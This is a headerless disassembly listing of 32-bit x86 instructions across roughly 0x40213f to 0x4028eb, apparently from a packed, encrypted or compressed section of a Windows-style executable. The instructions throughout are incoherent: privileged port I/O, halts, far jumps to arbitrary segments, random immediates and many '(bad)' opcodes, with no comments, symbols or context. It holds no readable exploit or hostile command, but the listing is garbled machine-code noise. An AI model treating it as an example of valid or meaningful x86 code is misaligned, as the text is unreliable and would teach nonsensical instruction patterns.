  40213f:	imul   BYTE PTR [esi+0x27eaa035]
  402145:	or     DWORD PTR [eax],edi
  402147:	rol    BYTE PTR [edi-0x3a0d254b],0xbc
  40214e:	mov    DWORD PTR [eax+0x5d],ecx
  402151:	in     al,0x17
  402153:	xchg   esi,eax
  402154:	push   es
  402155:	push   esi
  402156:	ins    DWORD PTR es:[edi],dx
  402157:	pop    ds
  402158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402159:	pop    eax
  40215a:	retf   
  40215b:	cmp    ah,dl
  40215d:	and    al,0xb2
  40215f:	mov    DWORD PTR [ebp+0x30],edi
  402162:	xor    ebx,ecx
  402164:	scas   al,BYTE PTR es:[edi]
  402165:	retf   
  402166:	push   esp
  402167:	lock dec esi
  402169:	in     al,dx
  40216a:	xor    bh,ah
  40216c:	xchg   ecx,eax
  40216d:	aaa    
  40216e:	enter  0xec96,0xe8
  402172:	push   ebx
  402173:	and    dl,BYTE PTR [edi]
  402175:	cmp    al,dl
  402177:	ret    
  402178:	test   BYTE PTR [eax-0x73b72d3],bh
  40217e:	test   DWORD PTR [esi],ebx
  402180:	lds    ebx,FWORD PTR [ebx+0x6c06dc2c]
  402186:	or     DWORD PTR [esi+0x5162b330],eax
  40218c:	push   ebp
  40218d:	pusha  
  40218e:	es sbb eax,0xb0c23c96
  402194:	xchg   esp,eax
  402195:	dec    ebp
  402196:	sub    al,0x37
  402198:	sti    
  402199:	clc    
  40219a:	sti    
  40219b:	shl    DWORD PTR [edi-0x45],1
  40219e:	les    edi,FWORD PTR [esp+ecx*4-0x4b]
  4021a2:	mov    ecx,0xca59bc97
  4021a7:	leave  
  4021a8:	nop
  4021a9:	and    dl,bh
  4021ab:	mov    al,0x2
  4021ad:	leave  
  4021ae:	popf   
  4021af:	das    
  4021b0:	out    0xe1,al
  4021b2:	cmp    ah,cl
  4021b4:	jo     0x40218e
  4021b6:	lds    ebp,FWORD PTR [esi-0x42]
  4021b9:	arpl   di,di
  4021bb:	mov    ds:0x7f399370,eax
  4021c0:	aas    
  4021c1:	addr16 lahf 
  4021c3:	xor    BYTE PTR [ecx+0x32d54ed6],dl
  4021c9:	mov    eax,0xa7d94d8a
  4021ce:	jnp    0x402212
  4021d0:	or     eax,0xaa628444
  4021d5:	loopne 0x40216c
  4021d7:	xor    eax,ecx
  4021d9:	add    eax,0xdee1ad33
  4021de:	pop    edi
  4021df:	test   DWORD PTR [ebx+ecx*1],0xb99f339f
  4021e6:	mov    ecx,esi
  4021e8:	lea    edi,[edi]
  4021ea:	dec    ebx
  4021eb:	fwait
  4021ec:	scas   eax,DWORD PTR es:[edi]
  4021ed:	out    dx,eax
  4021ee:	repnz pushf 
  4021f0:	mov    ebx,DWORD PTR ds:0xbf743e62
  4021f6:	pop    ebx
  4021f8:	aam    0x3f
  4021fa:	imul   esp,DWORD PTR [ecx],0x34
  4021fd:	ja     0x402224
  4021ff:	sub    eax,0x4225ece8
  402204:	dec    esi
  402205:	adc    ch,BYTE PTR [ecx]
  402207:	xchg   esi,eax
  402208:	dec    ebp
  402209:	in     eax,dx
  40220a:	out    dx,eax
  40220b:	xor    eax,0x7bdb7f6b
  402210:	cli    
  402211:	cld    
  402212:	es inc edi
  402214:	std    
  402215:	adc    eax,0x5aea2319
  40221a:	cld    
  40221b:	and    DWORD PTR [eax-0x6cc9a169],esi
  402221:	hlt    
  402222:	div    DWORD PTR [edx]
  402224:	pushf  
  402225:	retf   
  402226:	pop    ss
  402227:	dec    esp
  402228:	mov    eax,ds:0x9ab182f5
  40222d:	sti    
  40222e:	dec    edx
  40222f:	jne    0x402207
  402231:	cdq    
  402232:	jmp    0x2d433934
  402237:	test   eax,0xab9a16a9
  40223c:	cmp    eax,0x943a2388
  402241:	jge    0x40220f
  402243:	(bad)  
  402245:	inc    ebx
  402246:	add    eax,0x86662b84
  40224b:	and    DWORD PTR [edi-0x68064d5d],ebp
  402251:	jp     0x402251
  402253:	cmp    DWORD PTR [ecx],eax
  402255:	pop    ebp
  402256:	iret   
  402257:	in     eax,dx
  402258:	or     eax,DWORD PTR [ebp-0x3e9a5e46]
  40225e:	fwait
  40225f:	out    dx,al
  402260:	xchg   ch,ah
  402262:	inc    esi
  402263:	sub    al,BYTE PTR [ebx+0x9]
  402266:	out    dx,al
  402267:	cdq    
  402268:	call   0x77cefa69
  40226d:	popa   
  40226e:	scas   al,BYTE PTR es:[edi]
  40226f:	cmp    DWORD PTR [edi+0xe],ecx
  402272:	push   ebx
  402273:	(bad)  
  402274:	cmc    
  402275:	adc    BYTE PTR [edi],bh
  402277:	sbb    DWORD PTR [eax+ebx*2-0x54],ebx
  40227b:	stc    
  40227c:	repz jo 0x4022c8
  40227f:	outs   dx,DWORD PTR ds:[esi]
  402280:	sbb    eax,0xd65e8d1e
  402285:	cmp    BYTE PTR [edi],0xf9
  402288:	jae    0x402229
  40228a:	dec    esp
  40228b:	push   ebp
  40228c:	push   esi
  40228d:	ins    BYTE PTR es:[edi],dx
  40228e:	push   ecx
  40228f:	pop    ecx
  402290:	pop    ebp
  402291:	push   cs
  402292:	fst    QWORD PTR [edi-0x26]
  402295:	inc    ecx
  402296:	enter  0x1f1b,0x3e
  40229a:	pop    eax
  40229b:	je     0x4022ae
  40229d:	adc    al,0xc0
  40229f:	lea    edi,[eax+0xe22d4ff]
  4022a5:	cmc    
  4022a6:	inc    ebx
  4022a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022a8:	sbb    DWORD PTR [esi-0x1a],ecx
  4022ab:	push   es
  4022ac:	and    al,0xc2
  4022ae:	mov    ch,BYTE PTR [eax+edi*8]
  4022b1:	loopne 0x402279
  4022b3:	and    eax,0x79dba1c9
  4022b8:	mov    cl,0xbe
  4022ba:	hlt    
  4022bb:	jmp    0x674ea457
  4022c0:	dec    esi
  4022c1:	jo     0x4022b4
  4022c3:	(bad)  
  4022c4:	mov    edx,0x6931eb1b
  4022c9:	pop    ss
  4022ca:	repz pop esi
  4022cc:	retf   0x2c4f
  4022cf:	dec    esp
  4022d0:	in     al,0x7b
  4022d2:	mov    edx,DWORD PTR [eax+eax*1]
  4022d5:	xchg   DWORD PTR [ebp-0x63],ecx
  4022d8:	in     eax,0xeb
  4022da:	das    
  4022db:	jg     0x4022fa
  4022dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022de:	or     bl,ah
  4022e0:	mov    al,ds:0x5828f537
  4022e5:	or     eax,0x681bcad6
  4022ea:	xor    edi,ebx
  4022ec:	lock addr16 in eax,0x20
  4022f0:	and    eax,0x1353532c
  4022f5:	pop    es
  4022f6:	cmp    al,0x39
  4022f8:	add    BYTE PTR [ecx+0x4ff2e928],ch
  4022fe:	repz js 0x4022cb
  402301:	jae    0x40234b
  402303:	sahf   
  402304:	push   ds
  402305:	out    0x58,eax
  402307:	je     0x402377
  402309:	dec    eax
  40230a:	xchg   edx,eax
  40230b:	popf   
  40230c:	mov    ds,eax
  40230e:	(bad)
  402313:	pop    es
  402314:	mov    esi,0x19022b9f
  402319:	push   ss
  40231a:	aaa    
  40231b:	retf   0x52ef
  40231e:	inc    ecx
  40231f:	jo     0x402307
  402321:	(bad)  
  402322:	sub    ebp,esi
  402324:	jmp    0x4022e5
  402326:	mov    ah,0x7b
  402328:	adc    al,0x6e
  40232a:	test   BYTE PTR [esi+eiz*2],ah
  40232d:	cmp    ah,dl
  40232f:	test   BYTE PTR [ecx],ch
  402331:	mov    esp,0x3852849c
  402336:	pop    esp
  402337:	xor    DWORD PTR [eax+0x6a],ecx
  40233a:	lods   al,BYTE PTR ds:[esi]
  40233b:	add    DWORD PTR [ebx-0x75d3412f],0x44
  402342:	daa    
  402343:	in     al,dx
  402344:	jmp    0x402357
  402346:	jo     0x402394
  402348:	push   ebp
  402349:	jl     0x4023c9
  40234b:	dec    esi
  40234c:	jbe    0x402366
  40234e:	xor    dl,dh
  402350:	mov    cl,0x50
  402352:	dec    ebx
  402353:	mov    BYTE PTR [edi-0x2],dl
  402356:	mov    esp,0xd03aa0e3
  40235b:	daa    
  40235c:	or     bh,BYTE PTR [esi+0x3e]
  40235f:	xchg   ebx,eax
  402360:	mov    ah,0x22
  402362:	mov    bl,BYTE PTR cs:[ebp+0x1ab1666]
  402369:	jge    0x402390
  40236b:	out    0x25,al
  40236d:	dec    eax
  40236e:	scas   eax,DWORD PTR es:[edi]
  40236f:	mov    ds:0xa67e2be5,eax
  402374:	cwde   
  402375:	aad    0x23
  402377:	nop
  402378:	sub    al,0x7f
  40237a:	mov    eax,DWORD PTR [edi-0x6d]
  40237d:	inc    esp
  40237e:	push   ebx
  40237f:	fsubrp st(2),st
  402381:	retf   
  402382:	inc    ebp
  402383:	mov    ebp,0x8a1fc999
  402388:	xchg   edi,eax
  402389:	push   ds
  40238a:	cmp    eax,0x25f05d5e
  40238f:	ret    
  402390:	mov    ds:0x8085f781,eax
  402395:	mov    eax,0x5bf25998
  40239a:	dec    ebp
  40239b:	addr16 mov cl,0x61
  40239e:	jmp    0x4023e6
  4023a0:	call   0x4749e31e
  4023a5:	ss mov ds,esp
  4023a8:	lods   eax,DWORD PTR ds:[esi]
  4023a9:	call   FWORD PTR [esi-0x6d]
  4023ac:	imul   ebp,DWORD PTR [edx],0xee27a69b
  4023b2:	int    0x8e
  4023b4:	(bad)  
  4023b5:	xor    BYTE PTR [edi],bh
  4023b7:	aam    0x36
  4023b9:	cld    
  4023ba:	ret    
  4023bb:	test   ah,ch
  4023bd:	imul   ebx,DWORD PTR [edi+0x42],0xbca5971c
  4023c4:	adc    eax,0x26a971f3
  4023c9:	popf   
  4023ca:	pop    esp
  4023cb:	pop    esp
  4023cc:	aaa    
  4023cd:	mov    ds,WORD PTR [ecx+esi*1]
  4023d0:	lods   eax,DWORD PTR ds:[esi]
  4023d1:	and    ebx,ecx
  4023d3:	cmp    ebx,esp
  4023d5:	xchg   ebx,eax
  4023d6:	test   DWORD PTR [eax],0x170f5aad
  4023dc:	xor    al,BYTE PTR [ecx-0x5148f11a]
  4023e2:	out    0x35,eax
  4023e4:	add    DWORD PTR [ebp+0x579a0452],edx
  4023ea:	xor    edx,ebx
  4023ec:	mov    ds:0xae926f0f,al
  4023f1:	mov    ecx,0x90cad207
  4023f6:	jle    0x402412
  4023f8:	test   al,0xdb
  4023fa:	pop    ecx
  4023fb:	loope  0x4023b5
  4023fd:	lods   al,BYTE PTR ds:[esi]
  4023fe:	psllq  mm3,QWORD PTR [ebp+edx*2-0x4a]
  402403:	fwait
  402404:	or     eax,0xcc8d9366
  402409:	cmp    DWORD PTR [esi+0x59],edx
  40240c:	push   esp
  40240d:	repz xor dl,dl
  402410:	jecxz  0x4023be
  402412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402413:	not    DWORD PTR [ebx-0xd]
  402416:	pusha  
  402417:	std    
  402418:	push   ss
  402419:	cmp    dl,BYTE PTR [esi-0x64a8641e]
  40241f:	jmp    0x5f782819
  402424:	arpl   WORD PTR [ebx-0x11eab8e7],ax
  40242a:	xor    DWORD PTR [edx],edx
  40242c:	or     al,0x80
  40242e:	imul   ecx,ebp,0x41404025
  402434:	pop    ebx
  402435:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402436:	sbb    eax,0x919efca2
  40243b:	stos   BYTE PTR es:[edi],al
  40243c:	fisub  WORD PTR [ecx]
  40243e:	aas    
  40243f:	cdq    
  402440:	lods   al,BYTE PTR ds:[esi]
  402441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402442:	fldenv [eax+0x61641c5e]
  402448:	pop    edx
  402449:	bound  edi,QWORD PTR [ebx-0x3d]
  40244c:	pop    ecx
  40244d:	xchg   ecx,eax
  40244e:	xchg   esp,eax
  40244f:	sbb    DWORD PTR [eax+0x4e31c1ca],esp
  402455:	or     ah,BYTE PTR [edi+0x4bb099a6]
  40245b:	arpl   WORD PTR [edi],dx
  40245d:	sbb    BYTE PTR [esi],0x8e
  402460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402461:	pop    ebp
  402462:	leave  
  402463:	mov    dh,0x26
  402465:	cmp    DWORD PTR [ebp-0x33676c69],esp
  40246b:	je     0x40241d
  40246d:	(bad)  
  40246f:	mov    edx,0x80a72006
  402474:	jno    0x402417
  402476:	xchg   esi,eax
  402478:	mov    eax,ds:0x37694bfa
  40247d:	pop    eax
  40247e:	addr16 mov al,ds:0xc701
  402482:	mov    al,ds:0x39a42dc3
  402487:	outs   dx,DWORD PTR ds:[esi]
  402488:	adc    esi,0xffffff9f
  40248b:	das    
  40248c:	popf   
  40248d:	and    ch,BYTE PTR [edx+0x10d76006]
  402493:	jne    0x402493
  402495:	sub    BYTE PTR [edx+0x6],al
  402498:	fimul  DWORD PTR [ebx+0x280ed8d0]
  40249e:	nop
  40249f:	xlat   BYTE PTR ds:[ebx]
  4024a0:	mov    eax,ecx
  4024a2:	inc    ecx
  4024a3:	inc    eax
  4024a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024a5:	sub    edx,DWORD PTR [ebx]
  4024a7:	call   0x2864:0x71e84ade
  4024ae:	push   ecx
  4024af:	cmp    eax,0x25df645e
  4024b4:	dec    edi
  4024b5:	sbb    BYTE PTR [eax],bh
  4024b7:	addr16 xor al,0x58
  4024ba:	retf   
  4024bb:	xchg   ebx,eax
  4024bc:	xchg   ebp,eax
  4024bd:	cld    
  4024be:	mov    ch,BYTE PTR [esi+0x24]
  4024c1:	out    dx,eax
  4024c2:	cld    
  4024c3:	in     eax,dx
  4024c4:	inc    ebp
  4024c5:	call   0xeebb:0x680d449d
  4024cc:	dec    edi
  4024cd:	dec    esp
  4024ce:	jmp    FWORD PTR [edx+0x6e]
  4024d1:	inc    esp
  4024d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024d3:	push   0xffffffaf
  4024d5:	jmp    0x8cb:0x3bafe492
  4024dc:	pmaddwd mm7,QWORD PTR [eax-0x736b9d0]
  4024e3:	rcl    BYTE PTR [esi+eiz*8],0x8a
  4024e7:	push   ss
  4024e8:	aad    0xe1
  4024ea:	fimul  DWORD PTR [edi]
  4024ec:	add    al,0xc0
  4024ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024ef:	or     BYTE PTR [ebx],dh
  4024f1:	scas   al,BYTE PTR es:[edi]
  4024f2:	and    BYTE PTR [ecx-0x1e],bl
  4024f5:	sbb    DWORD PTR [ebp+0x66],ebp
  4024f8:	mov    bh,0x84
  4024fa:	xor    ecx,DWORD PTR [edi]
  4024fc:	ret    0x4a53
  4024ff:	into   
  402500:	push   cs
  402501:	stc    
  402502:	mov    bh,0x6b
  402504:	inc    esi
  402505:	loope  0x402542
  402507:	sbb    eax,0xa6e31a24
  40250c:	mov    dh,0x81
  40250e:	iret   
  40250f:	or     esp,edi
  402511:	adc    ah,BYTE PTR [ecx+0x4e5d0063]
  402517:	outs   dx,BYTE PTR ds:[esi]
  402518:	fs loopne 0x402571
  40251b:	jbe    0x402585
  40251d:	mov    ebp,0xf6121e43
  402522:	data16 or BYTE PTR [esi-0x7f362a43],al
  402529:	pop    ss
  40252a:	xor    DWORD PTR ds:[ebp-0x78],eax
  40252e:	push   ecx
  40252f:	clc    
  402530:	push   ecx
  402531:	or     dl,dl
  402533:	fidiv  DWORD PTR [eax+0x62]
  402536:	into   
  402537:	in     eax,0x16
  402539:	mov    al,BYTE PTR [ecx-0x2cfe2123]
  40253f:	adc    esp,DWORD PTR [eax]
  402541:	dec    ebx
  402542:	cmc    
  402543:	adc    eax,0xa2273562
  402548:	stos   BYTE PTR es:[edi],al
  402549:	xchg   edi,eax
  40254a:	icebp  
  40254b:	test   DWORD PTR [esi-0x50],ebp
  40254e:	repnz (bad) 
  402550:	out    dx,al
  402551:	lods   eax,DWORD PTR ds:[esi]
  402552:	sti    
  402553:	xor    al,bh
  402555:	xchg   edx,eax
  402556:	fisubr DWORD PTR [ecx-0x56]
  402559:	neg    BYTE PTR [edx+0x35]
  40255c:	sbb    BYTE PTR [edx+0x30],dl
  40255f:	inc    ebp
  402560:	lds    ebx,FWORD PTR [edx+0x4b5306c3]
  402566:	push   ebp
  402567:	jmp    0xeed98f7b
  40256c:	cmp    BYTE PTR [edi+0x2a],al
  40256f:	adc    eax,0xfa7fc946
  402574:	jbe    0x402586
  402576:	cmp    eax,0xb96811f0
  40257b:	xchg   ebp,eax
  40257c:	mov    ebx,0x388c0717
  402581:	mov    dh,0x81
  402583:	rcl    BYTE PTR [esi],1
  402585:	adc    edi,0x92fe6d0a
  40258b:	xchg   ebx,eax
  40258c:	repnz mov eax,0x3e5ccadb
  402592:	jp     0x4025a5
  402594:	cli    
  402595:	xchg   edi,eax
  402596:	jg     0x4025f5
  402598:	call   0xcf44f8bc
  40259d:	aad    0x9c
  40259f:	or     DWORD PTR [edi-0x46],0xffffffb5
  4025a3:	out    dx,al
  4025a4:	fdivr  QWORD PTR [ebx]
  4025a6:	cmp    cl,bh
  4025a8:	push   esi
  4025a9:	enter  0xeb66,0xf6
  4025ad:	mov    ebx,DWORD PTR [ecx-0x6f]
  4025b0:	aaa    
  4025b1:	push   ss
  4025b2:	ja     0x4025ae
  4025b4:	iret   
  4025b5:	jbe    0x4025c7
  4025b7:	ret    
  4025b8:	adc    eax,0xf4aee5de
  4025bd:	xor    al,0x72
  4025bf:	stos   DWORD PTR es:[edi],eax
  4025c0:	mov    dl,BYTE PTR [eax+edx*2-0x2d7f8426]
  4025c7:	outs   dx,BYTE PTR ds:[esi]
  4025c8:	(bad)  
  4025c9:	xor    eax,0xb96746e1
  4025ce:	scas   eax,DWORD PTR es:[edi]
  4025cf:	jge    0x4025b9
  4025d1:	daa    
  4025d2:	dec    edx
  4025d3:	sbb    DWORD PTR [ebx],ebp
  4025d5:	jo     0x40260e
  4025d7:	(bad)  
  4025d8:	aaa    
  4025d9:	jecxz  0x4025a9
  4025db:	push   ss
  4025dc:	jp     0x4025ec
  4025de:	into   
  4025df:	lods   eax,DWORD PTR ds:[esi]
  4025e0:	lods   eax,DWORD PTR ds:[esi]
  4025e1:	jmp    0xf0f9:0x2defbb61
  4025e8:	into   
  4025e9:	jae    0x402652
  4025eb:	test   DWORD PTR [edx-0x736531d3],esi
  4025f1:	into   
  4025f2:	les    eax,FWORD PTR [eax]
  4025f4:	jne    0x402578
  4025f6:	push   esi
  4025f7:	push   ebx
  4025f8:	mov    al,ds:0xe6183f4
  4025fd:	pop    eax
  4025fe:	scas   eax,DWORD PTR es:[edi]
  4025ff:	int    0xed
  402601:	xchg   esi,eax
  402602:	inc    esp
  402603:	inc    ecx
  402604:	or     bl,bl
  402606:	shr    BYTE PTR [esi],1
  402608:	cmp    cl,BYTE PTR [edx+0x34]
  40260b:	push   0x3d551923
  402610:	or     ah,BYTE PTR [esi+0x329a8bbd]
  402616:	aam    0xf7
  402618:	(bad)  
  402619:	jmp    0x402676
  40261b:	inc    esp
  40261c:	inc    ebx
  40261d:	in     eax,0x34
  40261f:	inc    ebx
  402620:	(bad)
  402624:	push   ss
  402625:	fldenv [ecx-0x5]
  402628:	cs cdq 
  40262a:	repz add esp,DWORD PTR [eax+ebp*1+0x47ee7677]
  402632:	mov    ah,0x75
  402634:	cmc    
  402635:	es out 0x1d,al
  402638:	test   eax,0x20fae9c9
  40263d:	stos   DWORD PTR es:[edi],eax
  40263e:	jg     0x402649
  402640:	pop    ecx
  402641:	push   ebx
  402642:	das    
  402643:	les    edi,FWORD PTR ds:0x1ff58446
  402649:	int3   
  40264a:	scas   eax,DWORD PTR es:[edi]
  40264b:	or     esi,esp
  40264d:	dec    ecx
  40264e:	hlt    
  40264f:	clc    
  402650:	std    
  402651:	xchg   ebx,eax
  402652:	ins    BYTE PTR es:[edi],dx
  402653:	push   ebx
  402654:	dec    esp
  402655:	dec    ecx
  402656:	fld    DWORD PTR [ebx-0x4e]
  402659:	push   ds
  40265a:	test   BYTE PTR ds:0x8075dae3,dh
  402660:	push   es
  402661:	cdq    
  402662:	pop    esi
  402663:	rcl    ebp,0x46
  402666:	push   0x58
  402668:	out    0xeb,eax
  40266a:	ret    0xb996
  40266d:	push   ecx
  40266e:	icebp  
  40266f:	mov    ebx,0xdf8205cb
  402674:	in     al,0xac
  402676:	jg     0x40260d
  402678:	(bad)  
  402679:	mov    al,0x31
  40267b:	fwait
  40267c:	and    al,0xa
  40267e:	aaa    
  40267f:	shr    dl,0xc
  402682:	fwait
  402683:	pop    esp
  402684:	xor    BYTE PTR [edx+edi*8-0x24],bl
  402688:	pop    ecx
  402689:	(bad)  
  40268a:	data16 je 0x4026ae
  40268d:	mov    bh,0x70
  40268f:	out    0xbc,al
  402691:	pop    ecx
  402692:	dec    esi
  402693:	and    DWORD PTR [esi-0x536aa3e4],edi
  402699:	fistp  QWORD PTR [edi+0x2440011d]
  40269f:	cmp    eax,0xc4e44b
  4026a5:	lods   eax,DWORD PTR fs:[esi]
  4026a7:	fs in  eax,dx
  4026a9:	(bad)  
  4026aa:	adc    al,0x48
  4026ac:	repz add DWORD PTR [ebp-0x79],esi
  4026b0:	enter  0xeea5,0xff
  4026b4:	pop    es
  4026b5:	push   ebp
  4026b6:	mov    al,BYTE PTR [eax-0x29]
  4026b9:	sti    
  4026ba:	aad    0xee
  4026bc:	pop    edx
  4026bd:	dec    edx
  4026be:	pusha  
  4026bf:	pop    eax
  4026c0:	ins    DWORD PTR es:[edi],dx
  4026c1:	xchg   BYTE PTR [edx+0x6e],cl
  4026c4:	retf   
  4026c5:	in     al,0xc2
  4026c7:	sub    bl,ah
  4026c9:	push   esp
  4026ca:	adc    BYTE PTR ss:[esi-0x4f],dh
  4026ce:	scas   eax,DWORD PTR es:[edi]
  4026cf:	repz mov edx,0x38bba620
  4026d5:	push   es
  4026d6:	ins    DWORD PTR es:[edi],dx
  4026d7:	loope  0x4026c9
  4026d9:	sbb    edx,DWORD PTR [ecx-0x41]
  4026dc:	inc    eax
  4026dd:	pop    ss
  4026de:	jge    0x40270d
  4026e0:	mov    ebx,0xc2845bff
  4026e5:	mov    cl,0xef
  4026e7:	xlat   BYTE PTR ds:[ebx]
  4026e8:	mov    cl,0x82
  4026ea:	pushf  
  4026eb:	pushf  
  4026ec:	cs or  DWORD PTR ds:[ebp-0x5b9c47b],edx
  4026f4:	sbb    eax,0xb1c355b9
  4026f9:	dec    ecx
  4026fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026fb:	pushf  
  4026fc:	add    DWORD PTR [ecx],edi
  4026fe:	mov    ecx,0x84fa41ae
  402703:	rol    DWORD PTR [ebx],1
  402705:	mov    BYTE PTR [edx+eax*8],0xf9
  402709:	mov    cl,0xc2
  40270b:	pop    es
  40270c:	jmp    0x5f510ab8
  402711:	mov    esp,0xff43ea02
  402716:	jbe    0x4026c3
  402718:	test   al,0x4f
  40271a:	push   esp
  40271b:	pusha  
  40271c:	ret    0xa891
  40271f:	push   0xffffffe8
  402721:	jne    0x4026b7
  402723:	jnp    0x402733
  402725:	jecxz  0x4026c7
  402727:	pop    ecx
  402728:	push   esp
  402729:	call   0x255c:0x74f7ab12
  402730:	xchg   ebp,eax
  402731:	adc    ah,ch
  402733:	pop    ebx
  402734:	cmp    esi,edx
  402736:	xchg   ecx,eax
  402737:	dec    BYTE PTR [esp+ebp*8+0x3f]
  40273b:	fwait
  40273c:	sbb    esp,DWORD PTR [esi+esi*1-0x37]
  402740:	sbb    eax,0x3186190c
  402745:	sub    ebx,DWORD PTR [eax]
  402747:	ins    DWORD PTR es:[edi],dx
  402748:	and    dh,bh
  40274a:	or     BYTE PTR [eax+0x62],0xfb
  40274e:	fistp  DWORD PTR [ebx-0x62]
  402751:	dec    edx
  402752:	mov    ss,WORD PTR [edx]
  402754:	jl     0x40270c
  402756:	cmp    bl,BYTE PTR [ebx]
  402758:	mul    DWORD PTR [edx+0x28]
  40275b:	mov    al,0xa8
  40275d:	int3   
  40275e:	mov    cl,0xb2
  402760:	gs pop ds
  402762:	test   al,0x25
  402764:	retf   0x923d
  402767:	sbb    BYTE PTR [eax],al
  402769:	adc    esp,ebp
  40276b:	fs dec edx
  40276d:	std    
  40276e:	dec    ecx
  40276f:	je     0x402702
  402771:	push   edi
  402772:	clc    
  402773:	xor    ecx,DWORD PTR [esi]
  402775:	mov    edi,0xed7ae36e
  40277a:	neg    ebp
  40277c:	fwait
  40277d:	stos   BYTE PTR es:[edi],al
  40277e:	adc    eax,0x5d1fe4ee
  402783:	mov    dh,0x62
  402785:	lods   al,BYTE PTR ds:[esi]
  402786:	or     ax,WORD PTR [ecx-0x36edc18f]
  40278d:	xor    al,0x84
  40278f:	jmp    0x1f5e70f6
  402794:	pop    esi
  402795:	push   ebp
  402796:	lods   eax,DWORD PTR ds:[esi]
  402797:	mov    ch,0x84
  402799:	jp     0x40278d
  40279b:	repz add eax,DWORD PTR [ebp+edx*8-0x51]
  4027a0:	xor    eax,0xb4721e27
  4027a5:	sahf   
  4027a6:	fwait
  4027a7:	cmp    bh,ah
  4027a9:	mov    al,0x4
  4027ab:	cmc    
  4027ac:	adc    esp,DWORD PTR [ebx+0x3e27bc0e]
  4027b2:	aad    0xab
  4027b4:	jl     0x4027ff
  4027b6:	fst    QWORD PTR [edx+esi*1]
  4027b9:	mov    eax,ds:0x54dac734
  4027be:	inc    esp
  4027bf:	adc    esi,eax
  4027c1:	jl     0x4027fc
  4027c3:	jmp    0x36cc:0x3f02d4ea
  4027ca:	xchg   esi,eax
  4027cb:	hlt    
  4027cc:	adc    dl,BYTE PTR [ebp+0x3e]
  4027cf:	push   ss
  4027d0:	inc    ebx
  4027d1:	cmp    dh,BYTE PTR [ecx-0x1d8bb385]
  4027d7:	xchg   edi,eax
  4027d8:	jle    0x40282a
  4027da:	mov    ds:0xedc6398e,al
  4027df:	mov    WORD PTR [edi+0x37],cs
  4027e2:	mov    al,0x87
  4027e4:	icebp  
  4027e5:	cs pop ebp
  4027e7:	mov    ebp,0x60488e8c
  4027ec:	sub    DWORD PTR [esi-0x23fdd5c3],ebp
  4027f2:	jmp    0x76851ef0
  4027f7:	shl    edi,1
  4027f9:	xchg   DWORD PTR [ecx],ebp
  4027fb:	popa   
  4027fc:	les    ebp,FWORD PTR [edi*8-0x5b1f10d2]
  402803:	les    ebx,FWORD PTR [ebp-0x46]
  402806:	addr16 push esp
  402808:	push   ss
  402809:	stos   BYTE PTR es:[edi],al
  40280a:	in     eax,0x47
  40280c:	sar    BYTE PTR [esi],cl
  40280e:	js     0x4027cc
  402810:	and    DWORD PTR [edi],edx
  402812:	cmp    bh,al
  402814:	sub    DWORD PTR [ebx+eax*4],ebx
  402817:	shl    BYTE PTR [esi-0x57],0x69
  40281b:	(bad)  
  40281c:	pop    ss
  40281d:	in     al,dx
  40281e:	js     0x4027d6
  402820:	ss mov ebx,0xd93242af
  402826:	lock in eax,dx
  402828:	(bad)  
  40282a:	pop    ecx
  40282b:	mov    esi,0x8e40fe20
  402830:	cli    
  402831:	adc    BYTE PTR [edx+ecx*1+0x5553b6bb],bh
  402838:	jmp    0xa461:0xd63fa611
  40283f:	test   edi,ebx
  402841:	fdivp  st(4),st
  402843:	inc    eax
  402844:	pmullw mm7,QWORD PTR [ebp-0x7fcba5cb]
  40284b:	aaa    
  40284c:	or     al,ah
  40284e:	stc    
  40284f:	dec    eax
  402850:	jns    0x40289b
  402852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402853:	push   esi
  402854:	mov    ds:0x625e9c0d,eax
  402859:	jle    0x4028aa
  40285b:	and    eax,0xda2469c0
  402860:	les    edi,FWORD PTR [edx]
  402862:	or     al,0x13
  402864:	loope  0x4027f7
  402866:	stc    
  402867:	mov    esi,0xb8a2611e
  40286c:	pop    ecx
  40286d:	add    DWORD PTR [ebx+0x70],ecx
  402870:	jmp    DWORD PTR [eax]
  402872:	(bad)
  402876:	ret    0xe99
  402879:	pop    ss
  40287a:	sti    
  40287b:	push   ebx
  40287c:	push   ebp
  40287d:	add    al,0x53
  40287f:	cmc    
  402880:	aam    0xc1
  402882:	lods   eax,DWORD PTR ds:[esi]
  402883:	push   edi
  402884:	push   eax
  402885:	or     edx,ecx
  402887:	xor    ebp,DWORD PTR [ebx-0x6b]
  40288a:	sub    DWORD PTR [ebp+0x61],esi
  40288d:	inc    edx
  40288e:	imul   ebx,esi,0x2c
  402891:	nop
  402892:	mov    eax,ds:0xc2fd63bf
  402897:	lds    edx,FWORD PTR [esi+0x3d]
  40289a:	jmp    0xc143:0x86f34815
  4028a1:	dec    eax
  4028a2:	aam    0xba
  4028a4:	jb     0x402877
  4028a6:	test   eax,eax
  4028a8:	int    0x4a
  4028aa:	lods   al,BYTE PTR ds:[esi]
  4028ab:	xor    eax,0x105dffbc
  4028b0:	mov    WORD PTR [edx-0x627d125b],?
  4028b6:	fidivr WORD PTR [eax-0x2c]
  4028b9:	mov    al,0x26
  4028bb:	fs ret 0xee47
  4028bf:	fwait
  4028c0:	adc    DWORD PTR es:[eax-0x6a],eax
  4028c4:	mov    cl,BYTE PTR [edx]
  4028c6:	in     al,0x43
  4028c8:	sti    
  4028c9:	lds    esp,FWORD PTR [ebx+0x5d]
  4028cc:	ds jns 0x4028f2
  4028cf:	loop   0x40289d
  4028d1:	in     al,dx
  4028d2:	idiv   BYTE PTR [edx]
  4028d4:	test   al,0x59
  4028d6:	xor    BYTE PTR [ecx],al
  4028d8:	ds sub ebp,edi
  4028db:	jmp    0xbf39625c
  4028e0:	cwde   
  4028e1:	xchg   esp,eax
  4028e2:	aaa    
  4028e3:	xchg   ebx,eax
  4028e4:	jmp    0xe8262883
  4028e9:	neg    BYTE PTR [ebx]
  4028eb:	jp     0x4028c6
